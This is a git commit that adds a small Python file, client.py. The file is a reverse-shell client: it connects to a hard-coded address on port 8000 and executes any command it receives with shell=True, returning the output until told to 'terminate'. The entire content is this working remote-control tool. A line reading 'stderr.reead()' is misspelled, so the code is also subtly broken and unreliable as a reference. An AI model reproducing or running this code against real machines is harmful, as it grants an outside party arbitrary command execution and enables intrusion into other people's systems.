b947f812a18dd650e0bf5f16f07b67c0ad56a993
ekkopy <thiagognlcn@gmail.com>
2019-10-01 20:02:06 -0300

    first version of client

---
+++ client.py
@@ -0,0 +1,19 @@
+# -*- coding: utf-8 -*-
+import socket
+import subprocess
+
+def open_connection_to_server():
+    sck = socket.socket()
+    sck.connect(("192.168.1.3", 8000))
+    while True:
+        cmd = sck.recv(1024)
+        if "terminate" in cmd.decode():
+            sck.close()
+            break
+        else:
+            command_process = subprocess.Popen(cmd.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
+            sck.send(command_process.stdout.read())
+            sck.send(command_process.stderr.reead())
+
+if __name__ == "__main__":
+    open_connection_to_server()
